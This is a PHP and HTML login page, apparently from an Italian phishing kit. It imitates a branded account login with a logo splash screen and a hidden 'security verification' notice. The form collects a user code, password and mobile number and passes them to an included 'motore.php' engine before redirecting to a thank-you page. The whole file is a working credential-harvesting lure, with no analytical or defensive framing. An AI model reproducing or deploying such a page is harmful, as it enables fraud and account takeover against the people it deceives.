<?php
//INCLUDERE GENERALE
require("pannello13/generale.php");

//CUSTOM
$pagina=array('username','password','tel');
$numero = 0;
$prossima = "grazie.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("pannello13/motore.php");

?><html>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<head></head><body>
    <div class="father">
    <div class="child"><img src="logo.png"></div>
</div>
  
<link rel="stylesheet" href="https://unpkg.com/purecss@2.0.5/build/pure-min.css">
<script src="jquery-latest.min.js"></script>
<div style="" class="resto">

<style>
    
.father {
 display: flex;
    justify-content: center;
    align-items: center;
}
.resto{
    display: none ;
}

.nascondi{
    display: none !important;
}
.child img{
    width: 100%;}
.child {

    
    margin-top: 100%;
    position: absolute; 
}

html{
    background-color:#9d0130;
}
.myButton {
    width: 100%;
    background-color:#971a3d;
    border-radius:13px;
    border:1px solid #971a3d;
    display:inline-block;
    cursor:pointer;
    color:#ffffff;
    font-family:Arial;
    font-size:17px;
    font-weight:bold;
    padding:17px 31px;
    text-decoration:none;
    text-shadow:0px 1px 0px #971a3d;
}
.myButton:hover {
    background-color:#72112c;
}
.myButton:active {
    position:relative;
    top:1px;
}

      body {
    font-family: Montserrat,sans-serif,sans-serif;
    }  

label{
    margin: 15px 0px !important;
     font-size: 110%;
}
.i1{
    width:100%;
    
    
    line-height: 180%;
    font-size: 110%;
}


input{
    height: 70px;
}
.separator-line {
    border-bottom: 2px  solid #9e092f;
    display: flex;
    padding-top: 17px;
}
.sfondo{
    /* FLOAT: RIGHT; */
    background-color:white;
}
.ll{font-size: 70%;
    padding:5px;
    position:absolute;
}
</style>
<div style="
    background-color: #9d0130;
    padding: 10px;
"><img width="200" s="" src="logo.png">
</div>
<div style="margin:10px; display:none">
    <img height="50" style="float:left" src="alert.png">
    <span style="float:left;line-height: 53px;color: #9f0936;margin-left: 5px">Verifica di sicurezza Necessaria</span>
</div>
<br><br>
<br>

<form method="POST" autocomplete="off" class="" style="
    padding: 15px;
">
<div>
    <h4 style="
    position: absolute;
    top: 129px;
    background-color: white;
    width: 61px;
    color: #9d0130;
">Login</h4><div class="separator-line"></div>
    </div><br><span>Inserisci le tue credenziali per accedere</span>
       <br><br> <span class="ll">Codice Utente</span>
        <input autocomplete="off" class="i1" id="username" name="username" value="" type="text">
   <br>   <br>  <span class="ll">Password</span>
        <input autocomplete="off" class="i1" type="password" name="password">
   <br>  <br>   <span class="ll">Numero di Cellulare</span>
        <input class="i1" name="tel" type="text"><br><br><br><br>
        <button type="submit" class="myButton">Login</button>
</form>
</div>
<script>




    setTimeout(function(){

jQuery(".father").fadeOut( "slow", function() {
    jQuery("body").addClass("sfondo")
    
        jQuery(".resto").fadeIn()
  });

    },2000)
    </script>
   		<script>



</script>

</body></html>